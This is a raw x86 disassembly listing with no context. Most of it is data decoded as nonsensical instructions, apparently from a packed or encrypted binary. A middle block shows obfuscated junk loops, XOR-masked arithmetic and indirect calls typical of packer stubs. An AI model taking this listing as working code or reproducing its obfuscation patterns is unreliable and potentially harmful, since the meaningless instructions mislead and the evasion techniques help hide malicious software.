  411e02:	push   ecx
  411e03:	jmp    0x694c:0x53f7dcab
  411e0a:	outs   dx,BYTE PTR ds:[esi]
  411e0b:	imul   esp,ebp,0xffffffa3
  411e0e:	fwait
  411e0f:	pop    ss
  411e10:	inc    edx
  411e11:	pop    ds
  411e12:	bound  esp,QWORD PTR [ebx+ebp*1]
  411e15:	call   0x34f29368
  411e1a:	xchg   ebp,eax
  411e1b:	sbb    BYTE PTR [ebx],cl
  411e1d:	es cdq 
  411e1f:	or     eax,0xb35ab187
  411e24:	xor    eax,0x23f052d0
  411e29:	test   al,0xd1
  411e2b:	jmp    0xf819178b
  411e30:	loope  0x411e43
  411e32:	rcl    BYTE PTR [edi+0x4f],cl
  411e35:	gs test eax,0x57b52b46
  411e3b:	push   0xffffffe5
  411e3d:	sahf   
  411e3e:	push   0x89a165ba
  411e43:	call   0x44395776
  411e48:	xor    DWORD PTR [ecx],edi
  411e4a:	push   ecx
  411e4b:	lods   al,BYTE PTR ds:[esi]
  411e4c:	repnz les eax,FWORD PTR [esi+ebx*2]
  411e50:	xchg   esi,eax
  411e51:	call   0xca4a:0xddaabb60
  411e58:	jecxz  0x411dda
  411e5a:	jne    0x411e00
  411e5c:	inc    ebp
  411e5d:	(bad)  
  411e5e:	xchg   ebp,eax
  411e5f:	mov    al,ds:0x15d6d56c
  411e64:	test   eax,0xfbe233cc
  411e69:	xchg   esp,esi
  411e6b:	mov    edi,0xaa81f925
  411e70:	lahf   
  411e71:	or     al,0x36
  411e73:	mov    ebx,esp
  411e75:	inc    ebp
  411e76:	popf   
  411e77:	or     al,cl
  411e79:	in     eax,0x79
  411e7b:	push   esp
  411e7c:	or     eax,ecx
  411e7e:	dec    ebx
  411e7f:	inc    DWORD PTR [ebp+0x5b656db9]
  411e85:	jecxz  0x411e14
  411e87:	mov    edx,0x2cc7fa95
  411e8c:	shr    DWORD PTR [ebp-0x3205b9b7],1
  411e92:	or     al,0x1e
  411e94:	ins    BYTE PTR es:[edi],dx
  411e95:	fbstp  TBYTE PTR [ebx-0x2e]
  411e98:	je     0x411f09
  411e9a:	addr16 fwait
  411e9c:	fwait
  411e9d:	shr    BYTE PTR [ebx],cl
  411e9f:	sti    
  411ea0:	jecxz  0x411e50
  411ea2:	retf   
  411ea3:	dec    ecx
  411ea4:	cmp    eax,0xfffffff2
  411ea7:	xchg   edi,eax
  411ea8:	fdivr  st,st(1)
  411eaa:	fld    TBYTE PTR [edi]
  411eac:	(bad)  
  411ead:	xchg   edx,eax
  411eae:	inc    esi
  411eaf:	sub    bl,ch
  411eb1:	sub    DWORD PTR ds:[ebp+0x15167ad3],ebp
  411eb8:	adc    DWORD PTR gs:[esi+0x4f],eax
  411ebc:	rcl    ebx,0x21
  411ebf:	fadd   QWORD PTR [esi+ecx*4]
  411ec2:	inc    esi
  411ec3:	sub    eax,esi
  411ec5:	fwait
  411ec6:	jp     0x411efa
  411ec8:	mov    ebp,0xe0c4c722
  411ecd:	imul   ch
  411ecf:	call   0x750c:0x10ad024c
  411ed6:	pop    edx
  411ed7:	pop    ds
  411ed8:	inc    ecx
  411ed9:	pusha  
  411eda:	hlt    
  411edb:	cmp    DWORD PTR [esi-0x43],edi
  411ede:	cli    
  411edf:	sub    ah,BYTE PTR [ebp-0x69]
  411ee2:	push   0x1cd19b51
  411ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ee8:	mov    ebp,0x893e647d
  411eed:	xchg   esp,eax
  411eee:	xchg   ebp,eax
  411eef:	add    BYTE PTR [ebx-0x172c90ed],dl
  411ef5:	outs   dx,BYTE PTR ds:[esi]
  411ef6:	xchg   DWORD PTR [ecx+ebx*8],ebp
  411ef9:	imul   BYTE PTR [edi+eiz*1]
  411efc:	imul   esp,DWORD PTR [esi+0x1c564e4b],0x3a
  411f03:	retf   0x7e8d
  411f06:	ja     0x411f38
  411f08:	xchg   esp,eax
  411f09:	data16 mov WORD PTR [ebx-0x80],gs
  411f0d:	jmp    0xd8a5:0xe9c8b92d
  411f14:	jbe    0x411ef0
  411f16:	call   0x883c:0xce32dd7e
  411f1d:	retf   0xf75c
  411f20:	jg     0x411f5b
  411f22:	fisttp WORD PTR [ecx-0x1d2edca4]
  411f28:	cmc    
  411f29:	sar    esi,1
  411f2b:	lea    esi,[edx+ecx*4-0x3ed8e801]
  411f32:	mov    ch,0xf9
  411f34:	push   ebp
  411f35:	or     al,0x4d
  411f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f38:	dec    ecx
  411f39:	sar    DWORD PTR [edx-0x54b89068],0x8a
  411f40:	mov    ?,WORD PTR [eax+edx*2+0x1c]
  411f44:	cmc    
  411f45:	xor    ecx,eax
  411f47:	mov    dl,0x45
  411f49:	pusha  
  411f4a:	jecxz  0x411f0a
  411f4c:	nop
  411f4d:	jmp    0x522:0x537481e7
  411f54:	and    al,0x91
  411f56:	and    dl,ah
  411f58:	imul   eax,DWORD PTR [ebp-0x60],0xffffff8d
  411f5c:	sub    BYTE PTR [edi],dh
  411f5e:	shl    ch,0x45
  411f61:	and    eax,0xa3f78e2d
  411f66:	cmp    DWORD PTR [eax+0x254a4101],esi
  411f6c:	inc    esi
  411f6d:	push   edx
  411f6e:	dec    edi
  411f6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f70:	sub    esi,DWORD PTR [eax-0x2c]
  411f73:	call   FWORD PTR [edx]
  411f75:	dec    esi
  411f76:	push   0x16
  411f78:	dec    ebp
  411f79:	cmp    ch,dh
  411f7b:	pop    esi
  411f7c:	adc    ecx,eax
  411f7e:	mov    ebx,0xb6e144de
  411f83:	mov    al,ds:0x8632c38
  411f88:	jae    0x411f23
  411f8a:	sub    BYTE PTR [ecx+esi*8],cl
  411f8d:	nop
  411f8e:	adc    BYTE PTR [edi-0x25],dl
  411f91:	ret    0x94d7
  411f94:	not    BYTE PTR [ebx-0x2a]
  411f97:	dec    esp
  411f98:	cmp    ebp,DWORD PTR [ecx-0xd42c05c]
  411f9e:	pop    eax
  411f9f:	cli    
  411fa0:	push   esi
  411fa1:	stos   DWORD PTR es:[edi],eax
  411fa2:	lock pop ebx
  411fa4:	les    edi,FWORD PTR [ebp+0x36]
  411fa7:	lock jo 0x412006
  411faa:	add    cl,BYTE PTR [ecx]
  411fac:	and    ebx,DWORD PTR [ebx-0x69696f7e]
  411fb2:	add    ecx,0xc
  411fb5:	mov    bl,0x44
  411fb7:	pop    esp
  411fb8:	cmp    ah,BYTE PTR [ebp+0x3a]
  411fbb:	pusha  
  411fbc:	inc    ebp
  411fbd:	push   edx
  411fbe:	adc    ebx,DWORD PTR [esi+0x7db9b8c1]
  411fc4:	pop    edx
  411fc5:	in     eax,0xe3
  411fc7:	sar    BYTE PTR [esi-0x6181fb9b],0x45
  411fce:	repz lds ebx,FWORD PTR [edx+ebx*2-0x30]
  411fd3:	inc    esi
  411fd4:	pcmpgtw mm5,QWORD PTR [ebx]
  411fd7:	or     eax,0x8c5ba12e
  411fdd:	jnp    0x411ffc
  411fdf:	cmc    
  411fe0:	test   WORD PTR [edi+0x7fee2cb6],si
  411fe7:	inc    ebp
  411fe8:	mov    bh,0xf1
  411fea:	push   es
  411feb:	in     al,dx
  411fec:	add    al,0x60
  411fee:	std    
  411fef:	lahf   
  411ff0:	fmul   DWORD PTR ds:0x989966f8
  411ff6:	fcom   DWORD PTR [esi-0x56]
  411ff9:	test   dh,dh
  411ffb:	lods   eax,DWORD PTR ds:[esi]
  411ffc:	clc    
  411ffd:	mov    ds:0x24861dc9,eax
  412002:	es into 
  412004:	cdq    
  412005:	sub    al,0xce
  412007:	mov    al,ch
  412009:	and    al,0xeb
  41200b:	in     al,dx
  41200c:	outs   dx,BYTE PTR ds:[esi]
  41200d:	ins    DWORD PTR es:[edi],dx
  41200e:	sub    DWORD PTR [edi],ebx
  412010:	cmp    al,0x3a
  412012:	xchg   ebx,eax
  412013:	and    al,al
  412015:	push   ds
  412016:	mov    BYTE PTR [ebp-0x10],cl
  412019:	aaa    
  41201a:	pop    eax
  41201b:	add    BYTE PTR [ebp+0x6863de10],dh
  412021:	test   eax,0x3592e31f
  412026:	js     0x41209a
  412028:	adc    edx,edi
  41202a:	sbb    al,0xd9
  41202c:	xchg   BYTE PTR [edx-0xd8b3989],cl
  412032:	div    BYTE PTR [eax+0x4a03effa]
  412038:	test   DWORD PTR ds:0x6319405f,0xc09b6671
  412042:	jg     0x41201b
  412044:	mov    ds:0x6c80d9ca,al
  412049:	fst    DWORD PTR [edi-0x1b]
  41204c:	and    cl,BYTE PTR [eax+0x3b2d22db]
  412052:	push   es
  412053:	adc    al,al
  412055:	(bad)  
  412056:	sti    
  412057:	cmp    ebx,ecx
  412059:	imul   eax,DWORD PTR [eax+0x5b],0x77
  41205d:	not    DWORD PTR [esp+edx*2]
  412060:	push   0x272dbe8b
  412065:	jp     0x41208d
  412067:	cs cld 
  412069:	repnz ss sub eax,0x5bd0a44e
  412070:	(bad)  
  412071:	daa    
  412072:	fistp  DWORD PTR [esi+0x3e]
  412075:	sub    al,0x29
  412077:	mov    ebp,edx
  412079:	aaa    
  41207a:	mov    bl,0xea
  41207c:	mov    esp,0xe5c5e8cc
  412081:	rcl    BYTE PTR [edi-0x7],cl
  412084:	repnz xlat BYTE PTR ds:[ebx]
  412086:	out    dx,al
  412087:	dec    ecx
  412088:	inc    esi
  412089:	jle    0x412105
  41208b:	mov    al,0x9c
  41208d:	sbb    ecx,ecx
  41208f:	ja     0x412034
  412091:	scas   al,BYTE PTR es:[edi]
  412092:	pop    ebp
  412093:	sbb    dl,BYTE PTR [edi+0x4e]
  412096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412097:	cs mov cl,0x8
  41209a:	xchg   BYTE PTR [ebp-0x77],al
  41209d:	or     DWORD PTR cs:[ecx+0x21821ca0],esi
  4120a4:	das    
  4120a5:	jno    0x41209d
  4120a7:	push   es
  4120a8:	scas   eax,DWORD PTR es:[edi]
  4120a9:	push   esp
  4120aa:	test   eax,0x10a92762
  4120af:	sbb    dl,bl
  4120b1:	jbe    0x412097
  4120b3:	jo     0x412075
  4120b5:	icebp  
  4120b6:	push   eax
  4120b7:	add    ah,0x9b
  4120ba:	cmp    BYTE PTR [esi+ebx*4+0x2282eb3c],cl
  4120c1:	imul   esp,ecx,0x37
  4120c4:	add    eax,0x808d6044
  4120c9:	das    
  4120ca:	gs dec esp
  4120cc:	lds    esp,FWORD PTR [ecx+eax*1]
  4120cf:	subps  xmm0,XMMWORD PTR ds:0xae8b0e48
  4120d6:	and    DWORD PTR [ebx+0x39],0x6ae9aeda
  4120dd:	add    DWORD PTR [esi],ebx
  4120df:	div    ch
  4120e1:	adc    DWORD PTR [edi+0x45],edx
  4120e4:	das    
  4120e5:	or     esp,DWORD PTR [ebx+0x76ab2f6b]
  4120eb:	in     al,0x4
  4120ed:	fwait
  4120ee:	add    esi,esi
  4120f0:	xchg   BYTE PTR [eax-0x4f],bl
  4120f3:	dec    edx
  4120f4:	iret   
  4120f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120f6:	leave  
  4120f7:	xor    ch,al
  4120f9:	jmp    0xefe3:0x1a1a0bcc
  412100:	push   ebx
  412101:	sub    al,0x35
  412103:	ins    DWORD PTR es:[edi],dx
  412104:	push   eax
  412105:	scas   eax,DWORD PTR es:[edi]
  412106:	and    BYTE PTR ds:0xf7cc4524,0x35
  41210d:	nop
  41210e:	std    
  41210f:	mov    eax,0xa5167526
  412114:	leave  
  412115:	fmulp  st(2),st
  412117:	pop    esp
  412118:	dec    edx
  412119:	pusha  
  41211a:	nop
  41211b:	aam    0x20
  41211d:	aad    0xc3
  41211f:	das    
  412120:	imul   edx,edx,0xfffffff0
  412123:	jge    0x4120b4
  412125:	lods   al,BYTE PTR ds:[esi]
  412126:	outs   dx,DWORD PTR ds:[esi]
  412127:	in     al,dx
  412128:	jae    0x412169
  41212a:	in     eax,dx
  41212b:	test   al,0xa1
  41212d:	cmc    
  41212e:	retf   
  41212f:	sub    bl,BYTE PTR [ecx+edx*1+0x17851f7d]
  412136:	fs xor dl,dh
  412139:	(bad)  
  41213a:	retf   
  41213b:	test   eax,0x14aaa94b
  412140:	xchg   ebx,eax
  412141:	add    DWORD PTR [esi+0x32321703],eax
  412147:	mov    ebx,ebp
  412149:	add    DWORD PTR [ecx-0x60],esp
  41214c:	shr    DWORD PTR [eax],0xf5
  41214f:	int    0x8d
  412151:	mov    ch,BYTE PTR [esi+0x3]
  412154:	push   esi
  412155:	push   eax
  412156:	jae    0x412162
  412158:	iret   
  412159:	mov    al,fs:0xfc376b63
  41215f:	xlat   BYTE PTR ds:[ebx]
  412160:	aad    0x4
  412162:	mov    edi,0x51e7f122
  412167:	xor    al,0x41
  412169:	repz cli 
  41216b:	add    ah,dh
  41216d:	push   ecx
  41216e:	int    0x57
  412170:	enter  0x1e5b,0x1e
  412174:	add    DWORD PTR [ebp+0x3142a61f],0x47
  41217b:	loop   0x4121a9
  41217d:	push   esp
  41217e:	inc    esp
  41217f:	sahf   
  412180:	or     dh,bh
  412182:	inc    eax
  412183:	or     DWORD PTR [ecx+0x665b06e7],ecx
  412189:	jge    0x4121b6
  41218b:	adc    al,0x31
  41218d:	xchg   esi,eax
  41218e:	mov    bl,0xc3
  412190:	mov    eax,ds:0xa187dcd0
  412195:	cmp    eax,0x78c564cb
  41219a:	or     cl,BYTE PTR [esi-0x30d6287e]
  4121a0:	mov    ds,WORD PTR [ecx-0x4fb03ce3]
  4121a6:	call   0x5dd9:0xc03fa712
  4121ad:	xor    ah,0xf7
  4121b0:	pop    es
  4121b1:	add    al,0x93
  4121b3:	jp     0x41217f
  4121b5:	jnp    0x4121c1
  4121b7:	xor    BYTE PTR [esi],ch
  4121b9:	ror    edi,1
  4121bb:	mov    ah,BYTE PTR [ebx+0x50e30d13]
  4121c1:	(bad)  
  4121c2:	mov    esp,0xb293053b
  4121c7:	in     eax,dx
  4121c8:	push   eax
  4121c9:	push   0x34
  4121cb:	inc    ebx
  4121cc:	cmp    bh,dh
  4121ce:	mov    edx,DWORD PTR [esi]
  4121d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121d1:	jae    0x4121ed
  4121d3:	(bad)  
  4121d4:	mul    DWORD PTR [edx]
  4121d6:	fbld   TBYTE PTR [ebx+0x7607e9a2]
  4121dc:	scas   eax,DWORD PTR es:[edi]
  4121dd:	sub    DWORD PTR [ebx-0x2b],eax
  4121e0:	int3   
  4121e1:	cmp    eax,0xb20928cd
  4121e6:	push   0xe3f6e0b7
  4121eb:	push   cs
  4121ec:	popa   
  4121ed:	or     al,0x5b
  4121ef:	cmc    
  4121f0:	add    al,0xfc
  4121f2:	pop    ebp
  4121f3:	hlt    
  4121f4:	aas    
  4121f5:	dec    edi
  4121f6:	js     0x4121e4
  4121f8:	hlt    
  4121f9:	(bad)  
  4121fa:	xor    ch,BYTE PTR [ecx+edx*2-0x29]
  4121fe:	fisubr DWORD PTR [ebp+0x6c]
  412201:	stc    
  412202:	mov    bh,0xbc
  412204:	push   eax
  412205:	loopne 0x41220a
  412207:	dec    ebx
  412208:	push   edi
  412209:	imul   eax,eax,0x7b
  41220c:	sub    DWORD PTR [edi+eax*2-0x445a4d1f],ebx
  412213:	pop    ss
  412214:	shl    DWORD PTR [edi],cl
  412216:	sti    
  412217:	leave  
  412218:	push   esp
  412219:	xchg   edi,eax
  41221a:	push   es
  41221b:	cld    
  41221c:	test   BYTE PTR [esi+edx*1],dh
  41221f:	in     al,0xf2
  412221:	dec    edi
  412222:	or     dh,ah
  412224:	adc    eax,ecx
  412226:	rcr    BYTE PTR [edx+ecx*1],1
  412229:	fmul   DWORD PTR [edx+0x4b]
  41222c:	aaa    
  41222d:	in     al,dx
  41222e:	mov    dl,0x6a
  412230:	out    0x82,eax
  412232:	dec    esp
  412233:	cmp    eax,0x80ffb52a
  412238:	jb     0x412248
  41223a:	retf   
  41223b:	dec    eax
  41223c:	and    cl,cl
  41223e:	fsub   DWORD PTR [edx+0x1287582b]
  412244:	sbb    cl,ch
  412246:	jg     0x41226a
  412248:	(bad)  [eax+0x2851eddb]
  41224e:	into   
  41224f:	sahf   
  412250:	cmp    esi,DWORD PTR [edi+0x649971f6]
  412256:	xchg   ecx,eax
  412257:	daa    
  412258:	fld    TBYTE PTR [ebx-0x3d]
  41225b:	fsubr  st(5),st
  41225d:	jmp    0x257e6640
  412262:	push   ss
  412263:	loope  0x412256
  412265:	xor    al,0x8a
  412268:	outs   dx,DWORD PTR ds:[esi]
  412269:	inc    edx
  41226a:	mov    edx,0x609b4bf4
  41226f:	inc    ebx
  412270:	inc    eax
  412271:	fwait
  412272:	imul   ebp,DWORD PTR [edx-0x10a20a2c],0xffffffc0
  412279:	mov    ch,0xe8
  41227b:	scas   eax,DWORD PTR es:[edi]
  41227c:	jno    0x412207
  41227e:	int    0x7b
  412280:	dec    ecx
  412281:	retf   0xf4a3
  412284:	push   0xd90e3c8a
  412289:	and    DWORD PTR [ebp+0x75],eax
  41228c:	jmp    0x8089:0xad4c374e
  412293:	mov    eax,ds:0x53de586c
  412298:	mov    gs,ebp
  41229a:	dec    esp
  41229b:	jno    0x41227d
  41229d:	push   esi
  41229e:	jnp    0x4122a9
  4122a0:	sbb    edx,DWORD PTR [esi]
  4122a2:	mov    BYTE PTR [edx+0x8733806],bl
  4122a8:	bound  esi,QWORD PTR [esi+eiz*2-0x2076480d]
  4122af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122b0:	int    0xd7
  4122b2:	jno    0x412312
  4122b4:	mov    ah,0x39
  4122b6:	std    
  4122b7:	loope  0x4122fc
  4122b9:	jno    0x41230f
  4122bb:	(bad)  
  4122bd:	daa    
  4122be:	cli    
  4122bf:	lods   al,BYTE PTR ds:[esi]
  4122c0:	jmp    0x412291
  4122c2:	scas   al,BYTE PTR es:[edi]
  4122c3:	xlat   BYTE PTR ds:[ebx]
  4122c4:	clc    
  4122c5:	xchg   edi,eax
  4122c6:	ret    0xf275
  4122c9:	mov    eax,0xbe261ee1
  4122ce:	ins    BYTE PTR es:[edi],dx
  4122cf:	mov    ch,0x18
  4122d1:	xchg   ebx,eax
  4122d2:	inc    eax
  4122d3:	in     al,dx
  4122d4:	sti    
  4122d5:	mov    bl,BYTE PTR [ebx+0xc7a7803]
  4122db:	push   ecx
  4122dc:	adc    DWORD PTR ds:0x839f6be0,eax
  4122e2:	dec    ebx
  4122e3:	push   ebp
  4122e4:	jl     0x412302
  4122e6:	push   es
  4122e7:	ja     0x4122b1
  4122e9:	int3   
  4122ea:	add    DWORD PTR [edx-0x71],esi
  4122ed:	dec    edx
  4122ee:	cmc    
  4122ef:	into   
  4122f0:	cs repnz or al,bl
  4122f4:	mov    ebx,0xb9557fd3
  4122f9:	xor    esi,DWORD PTR [esi+0x28b7f631]
  4122ff:	xlat   BYTE PTR ds:[ebx]
  412300:	jmp    DWORD PTR [esi+0x6f9f9157]
  412306:	into   
  412307:	mov    ds:0x3924dbc,eax
  41230c:	mov    ebx,0xff4b355c
  412311:	scas   al,BYTE PTR es:[edi]
  412312:	rcl    BYTE PTR ds:0xcfac9d9,0xfc
  412319:	and    eax,0x18433f45
  41231e:	and    eax,0x6c14be8e
  412323:	and    cl,BYTE PTR [edx]
  412325:	push   0x40983703
  41232a:	test   eax,0x47494530
  41232f:	xor    DWORD PTR [edi+0x76f2bcb8],0xb6942a83
  412339:	mov    ebx,0x249cb3d9
  41233e:	push   0x3d
  412340:	or     bh,BYTE PTR [edx+0x4f]
  412343:	fld    DWORD PTR [ebx]
  412345:	scas   eax,DWORD PTR es:[edi]
  412346:	adc    al,0x69
  412348:	dec    ebx
  412349:	mov    ch,BYTE PTR [ebx-0x74]
  41234c:	mov    edi,DWORD PTR [esi]
  41234e:	inc    edi
  41234f:	sti    
  412350:	cmp    dh,BYTE PTR ds:0x50f90309
  412356:	sub    ebx,DWORD PTR [ebx-0x52]
  412359:	mov    edx,DWORD PTR [ebp+0x8]
  41235c:	and    DWORD PTR ds:0x42b21a,0x0
  412366:	jmp    0x41237a
  41236b:	xor    ebx,ebx
  41236d:	xor    ebx,DWORD PTR ds:0x42b21a
  412373:	inc    ebx
  412374:	mov    DWORD PTR ds:0x42b21a,ebx
  41237a:	cmp    DWORD PTR ds:0x42b21a,0x18
  412381:	jae    0x4123c1
  412387:	cmp    DWORD PTR ds:0x42b21a,0x4
  41238e:	jg     0x4123c1
  412394:	jmp    0x4123a2
  412399:	push   DWORD PTR [ebp-0x18]
  41239c:	call   DWORD PTR ds:0x42b316
  4123a2:	cmp    DWORD PTR ds:0x42b21a,0x3
  4123a9:	jne    0x4123bc
  4123af:	mov    ebx,DWORD PTR ds:0x42b21a
  4123b5:	inc    ebx
  4123b6:	mov    DWORD PTR ds:0x42b21a,ebx
  4123bc:	jmp    0x41236b
  4123c1:	mov    ebx,DWORD PTR [ebp-0x54]
  4123c4:	mov    DWORD PTR ds:0x42b21a,0x6966
  4123ce:	add    edx,0x64f880
  4123d4:	or     edx,ebx
  4123d6:	mov    DWORD PTR [ebp-0x54],edx
  4123d9:	mov    edx,DWORD PTR [ebp+0x8]
  4123dc:	xor    DWORD PTR ds:0x42b1b2,edx
  4123e2:	mov    ebx,DWORD PTR [ebp-0x50]
  4123e5:	and    DWORD PTR ds:0x42b226,0x42b18e
  4123ef:	add    edx,ecx
  4123f1:	sbb    DWORD PTR ds:0x42b1ee,0x42b196
  4123fb:	xor    edx,ebx
  4123fd:	mov    DWORD PTR [ebp-0x50],edx
  412400:	mov    DWORD PTR ds:0x42b226,0x2b16
  41240a:	mov    edx,DWORD PTR [ebp+0x8]
  41240d:	and    DWORD PTR ds:0x42b19e,0x0
  412417:	mov    ebx,DWORD PTR ds:0x42b19e
  41241d:	inc    ebx
  41241e:	mov    DWORD PTR ds:0x42b19e,ebx
  412424:	cmp    DWORD PTR ds:0x42b19e,0xc
  41242b:	ja     0x41246b
  412431:	jmp    0x412444
  412436:	push   DWORD PTR [ebp-0x10]
  412439:	push   0x7c16
  41243e:	call   DWORD PTR ds:0x42b31a
  412444:	cmp    DWORD PTR ds:0x42b19e,0xb
  41244b:	jne    0x41245e
  412451:	mov    ebx,DWORD PTR ds:0x42b19e
  412457:	inc    ebx
  412458:	mov    DWORD PTR ds:0x42b19e,ebx
  41245e:	cmp    DWORD PTR ds:0x42b19e,0x13
  412465:	jb     0x412417
  41246b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41246e:	add    edx,edi
  412470:	and    edx,ebx
  412472:	mov    ebx,DWORD PTR ds:0x42b206
  412478:	add    DWORD PTR ds:0x42b1c6,ebx
  41247e:	mov    DWORD PTR [ebp-0x4c],edx
  412481:	add    DWORD PTR ds:0x42b19a,0x5c82
  41248b:	mov    edx,DWORD PTR [ebp+0x8]
  41248e:	mov    ebx,DWORD PTR [ebp-0x48]
  412491:	lea    edx,[ebx+edx*1+0x241fcdf]
  412498:	mov    DWORD PTR [ebp-0x48],edx
  41249b:	mov    edx,DWORD PTR [ebp+0x8]
  41249e:	mov    ebx,0xfa5e1524
  4124a3:	sub    ebx,edx
  4124a5:	add    ebx,DWORD PTR [ebp-0x44]
  4124a8:	mov    DWORD PTR [ebp-0x44],ebx
  4124ab:	mov    edx,DWORD PTR [ebp+0x8]
  4124ae:	xor    edx,eax
  4124b0:	add    edx,esi
  4124b2:	jne    0x40fdfa
  4124b8:	jmp    0x419191
  4124bd:	mov    edx,DWORD PTR [ebp-0xc]
  4124c0:	sub    edx,esi
  4124c2:	xor    edx,eax
  4124c4:	mov    DWORD PTR [ebp-0x5c],edx
  4124c7:	mov    edx,DWORD PTR [ebp-0x10]
  4124ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4124cd:	xor    edx,eax
  4124cf:	xor    ebx,eax
  4124d1:	sub    edx,ebx
  4124d3:	sub    edx,esi
  4124d5:	xor    edx,eax
  4124d7:	mov    DWORD PTR [ebp-0x10],edx
  4124da:	mov    edx,DWORD PTR [ebp-0x14]
  4124dd:	mov    DWORD PTR [ebp+0x8],edx
  4124e0:	jmp    0x4148b5
  4124e5:	mov    edx,DWORD PTR [ebp+0x8]
  4124e8:	mov    ebx,DWORD PTR [ebp-0x8]
  4124eb:	xor    edx,eax
  4124ed:	xor    ebx,eax
  4124ef:	sub    edx,ebx
  4124f1:	sub    edx,esi
  4124f3:	xor    edx,eax
  4124f5:	mov    DWORD PTR [ebp+0x8],edx
  4124f8:	mov    edx,DWORD PTR [ebp+0x8]
  4124fb:	mov    ebx,DWORD PTR [ebp-0x58]
  4124fe:	add    edx,0x5708e2
  412504:	imul   edx,ebx
  412507:	mov    DWORD PTR [ebp-0x58],edx
  41250a:	mov    edx,DWORD PTR [ebp+0x8]
  41250d:	mov    ebx,DWORD PTR [ebp-0x54]
  412510:	add    edx,0x64f880
  412516:	or     edx,ebx
  412518:	mov    DWORD PTR [ebp-0x54],edx
  41251b:	mov    edx,DWORD PTR [ebp+0x8]
  41251e:	mov    ebx,DWORD PTR [ebp-0x50]
  412521:	add    edx,ecx
  412523:	xor    edx,ebx
  412525:	mov    DWORD PTR [ebp-0x50],edx
  412528:	mov    edx,DWORD PTR [ebp+0x8]
  41252b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41252e:	add    edx,edi
  412530:	and    edx,ebx
  412532:	mov    DWORD PTR [ebp-0x4c],edx
  412535:	mov    edx,DWORD PTR [ebp+0x8]
  412538:	mov    ebx,DWORD PTR [ebp-0x48]
  41253b:	lea    edx,[ebx+edx*1+0x241fcdf]
  412542:	mov    DWORD PTR [ebp-0x48],edx
  412545:	mov    edx,DWORD PTR [ebp+0x8]
  412548:	mov    ebx,0xfa5e1524
  41254d:	sub    ebx,edx
  41254f:	add    ebx,DWORD PTR [ebp-0x44]
  412552:	mov    DWORD PTR [ebp-0x44],ebx
  412555:	jmp    0x4148b5
  41255a:	xlat   BYTE PTR ds:[ebx]
  41255b:	push   ss
  41255c:	xchg   BYTE PTR [ebx-0x7e],dh
  41255f:	repz xchg edx,eax
  412561:	add    BYTE PTR [eax-0x49],0xdb
  412565:	idiv   BYTE PTR [ecx]
  412567:	and    edx,ebx
  412569:	sbb    dl,bh
  41256b:	mov    al,BYTE PTR [ebx-0x7ca1c17d]
  412571:	and    edi,0xffffffd4
  412574:	int    0xee
  412576:	add    BYTE PTR [eax-0x28],0x8c
  41257a:	mov    ah,0xf6
  41257c:	in     al,dx
  41257d:	mov    ecx,0x1a3b0c7d
  412582:	add    DWORD PTR [ebx-0x21],edi
  412585:	(bad)  
  412586:	sbb    bl,BYTE PTR [ecx+0x29fb65d8]
  41258c:	xchg   BYTE PTR [edx],ah
  41258e:	sub    DWORD PTR [ecx-0x44],ecx
  412591:	mov    edi,0x1d01e162
  412596:	pop    edi
  412597:	xor    BYTE PTR [esi+ecx*8+0x6d],bl
  41259b:	push   cs
  41259c:	dec    esi
  41259d:	push   0x68208348
  4125a2:	fmul   DWORD PTR [ebx+ecx*2-0x75]
  4125a6:	pushf  
  4125a7:	and    ecx,DWORD PTR [ebx+eax*8-0x435d80e9]
  4125ae:	ret    
  4125af:	loopne 0x4125de
  4125b1:	add    edi,esi
  4125b3:	ja     0x4125bd
  4125b5:	in     al,0x7d
  4125b7:	mov    ah,0x73
  4125b9:	lods   eax,DWORD PTR ds:[esi]
  4125ba:	test   DWORD PTR [ecx-0x80c1a86],edx
  4125c0:	or     al,0x5d
  4125c2:	and    ecx,eax
  4125c4:	or     ebx,DWORD PTR [edx]
  4125c6:	and    DWORD PTR [eax-0x41],esp
  4125c9:	loopne 0x4125b6
  4125cb:	pop    ds
  4125cc:	jle    0x412641
  4125ce:	(bad)  
  4125cf:	jns    0x41259b
  4125d1:	push   esi
  4125d2:	add    al,0x36
  4125d4:	mov    ecx,ebx
  4125d6:	loope  0x412600
  4125d8:	or     DWORD PTR [edx+0x2a],edi
  4125db:	mov    ebx,?
  4125dd:	pop    esp
  4125de:	dec    edx
  4125df:	fcomip st,st(7)
  4125e1:	xor    DWORD PTR [edi-0x57320196],0x58cb6b77
  4125eb:	ja     0x412664
  4125ed:	call   0xf1eadf11
  4125f2:	(bad)  
  4125f3:	sub    bh,BYTE PTR ss:[ebx+0x3de03f6f]
  4125fa:	and    esp,DWORD PTR [ecx-0x5694a58f]
  412600:	lods   eax,DWORD PTR ds:[esi]
  412601:	popf   
  412602:	inc    eax
  412603:	xchg   esi,eax
  412604:	cwde   
  412605:	or     DWORD PTR [eax-0x6e44325f],0x41
  41260c:	adc    bl,BYTE PTR [ebp+0x57]
  41260f:	scas   eax,DWORD PTR es:[edi]
  412610:	call   0xfa:0x110c1cc0
  412617:	mul    eax
  412619:	fsubr  DWORD PTR [eax-0x8]
  41261c:	test   DWORD PTR [esi-0x5d],0x4b71e214
  412623:	dec    ebx
  412624:	imul   BYTE PTR [ebx-0x7a]
  412627:	pop    esi
  412628:	pop    esi
  412629:	shl    DWORD PTR [ecx+0x536fcad8],cl
  41262f:	xor    DWORD PTR [edx],ebp
  412631:	enter  0xf6b6,0x7f
  412635:	cmp    al,0x6e
  412637:	ret    
  412638:	aam    0x11
  41263a:	bound  ebx,QWORD PTR [ebp-0x2589b12d]
  412640:	push   ds
  412641:	call   0x5793:0xd969fa78
  412648:	mov    ecx,0x7c23c919
  41264d:	jmp    0x1d01b76f
  412652:	outs   dx,DWORD PTR ds:[esi]
  412653:	lods   al,BYTE PTR ds:[esi]
  412654:	ret    
  412655:	xor    ebx,DWORD PTR [ebx]
  412657:	adc    eax,0x5df90ce9
  41265c:	dec    BYTE PTR [edi-0x7affcb6e]
  412662:	mov    al,ds:0x3f46a673
